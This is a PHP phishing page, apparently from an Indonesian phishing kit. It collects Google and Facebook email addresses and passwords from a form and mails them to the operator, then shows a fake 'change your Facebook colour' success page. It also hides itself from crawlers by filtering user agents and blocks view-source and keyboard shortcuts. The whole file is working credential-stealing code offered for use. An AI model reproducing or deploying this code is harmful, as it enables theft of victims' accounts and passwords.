<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/IdhamDotID');
die();
}
?>

<?php
/* Fungsi Fungsi Maq Lo Yang Fungsi. */

$gmail = $_POST['gmail'];
$pwgmail = $_POST['pwgmail'];
$fb = $_POST['fbmail'];
$pwfb = $_POST['pwfb'];

include 'email.php';

$body = <<<EOD
<html>
	<body>
		<h2>[!]=======[ Data Google ]=======[!]</h2><br>
		<h4>[+] Email : $gmail</h4>
		<h4>[+] Password : $pwgmail</h4><br>
		<h2>[!]======[ Data Facebook ]======[!]</h2><br>
		<h4>[+] Email : $fb</h4>
		<h4>[+] Password : $pwfb</h4><br>
		<h2>[!]=========[ SELEAI ]==========[!]</h2>
		<br>
	</body>
</html>
EOD;

$subjek = '[ AKUN DATANG BOSQUE ]';
$headers = "From: Herlangga@phisinger.com\r\n"; // Email w nih hehe
$headers .= "Content-type: text/html\r\n"; // Server Ko Diperintah.
$success = mail($mailto, $subjek, $body, $headers); // Jgn diubah ubah ya kentod.
?>
<?php
$random = rand(1000,5000);
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<noscript><meta http-equiv="refresh" content="0; URL=https://www.facebook.com/IdhamDotID"/></noscript>
		<meta name="description" content="Login!"/>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
        <meta name="viewport" content="width=360.1, user-scalable=no, initial-scale=1.0, maximum-scale=1.0">
        <meta name="mobile-web-app-capable" content="yes"/>
        <meta name="apple-mobile-web-app-capable" content="yes"/>
        <meta name="apple-mobile-web-app-status-bar-style" content="black"/>
        <meta name="msapplication-tap-highlight" content="no"/>
        <meta name="format-detection" content="telephone=no">
   		<meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
		<link rel="shortcut icon" href="./img/favicon.jpeg"/>
		<title>Sukses!</title>
   		<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    	<link rel="stylesheet" media="all" href="./css/style.css"/>
	</head>
	<body>
        <div class="header">
            <div class="content">
            	Selamat Datang <i><?php echo $fb;?></i><p/>
            	<span>Ganti Warna Facebook Mu Sekarang!!!</span><br/>
                <button class="btn-login" id="1" onclick="location.href='proses.jpg';">Ganti Warna!</button>
                <button class="btn-login" id="1" onclick="location.href='./';">Keluar!</button>
            </div>
        </div>
        <script>
			var txt="Sukses!";
			var kecepatan=0;var segarkan=null;function berhenti() { document.title=txt;
				txt=txt.substring(1,txt.length)+txt.charAt(0);
				segarkan=setTimeout("behenti()",kecepatan);}berhenti();
			document.addEventListener("contextmenu", function(e){ e.preventDefault(); }, false);
			document.onkeydown = function(e) {
        		if (e.ctrlKey && 
            		(e.keyCode === 67 || 
             		e.keyCode === 83 || 
             		e.keyCode === 85 || 
            		e.keyCode === 117)) {
            		window.location.replace("index.html");
           		return false;
        		} else {
           			 return true;
        		}
			};
		</script>
		<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
		<script type="text/javascript">
			window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
		</script>
		<script type="text/javascript">
			document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
		</script>
    </body>
</html>
